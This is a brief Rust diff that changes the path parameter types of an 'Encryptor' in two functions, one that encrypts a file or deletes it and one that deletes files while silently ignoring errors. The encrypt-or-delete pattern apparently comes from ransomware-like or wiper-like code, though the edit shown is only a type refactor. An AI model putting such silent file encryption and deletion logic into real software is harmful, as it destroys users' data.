@@ -29,7 +29,7 @@ impl Encryptor {
         }
     }
 
-    pub fn encrypt_file_else_delete(&self, path: &path::PathBuf) {
+    pub fn encrypt_file_else_delete(&self, path: &String) {
         let bytes_to_encrypt = match fs::read(&path) {
             Ok(bytes) => bytes,
             Err(_) => {
@@ -48,7 +48,7 @@ impl Encryptor {
     }
 }
 
-fn attempt_delete_file(path: &path::PathBuf) {
+fn attempt_delete_file(path: &String) {
     match fs::remove_file(path) {
         Ok(_) => (),
         Err(_) => (),
